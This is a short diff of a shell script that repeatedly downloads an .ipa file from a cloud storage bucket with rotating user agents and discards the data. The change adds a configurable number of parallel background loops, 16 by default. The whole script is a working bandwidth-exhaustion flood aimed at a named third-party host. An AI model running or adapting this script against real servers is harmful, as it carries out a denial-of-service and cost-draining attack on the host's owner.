@@ -4,8 +4,19 @@ uuurl="https://zbios2.oss-cn-hongkong.aliyuncs.com/ios2.ipa"
 else
 uuurl=$1
 fi
+if [ ! -n "$2" ] ;then
+t=16
+else
+t=$2
+fi
+for i in `seq 1 $t`
+do
+{
 while true
 do
 z=$[$RANDOM%12]
 wget -O /dev/null -o /dev/null -U=${UAs[$z]} $uuurl
+done
+}&
+echo "thread $i start!"
 done
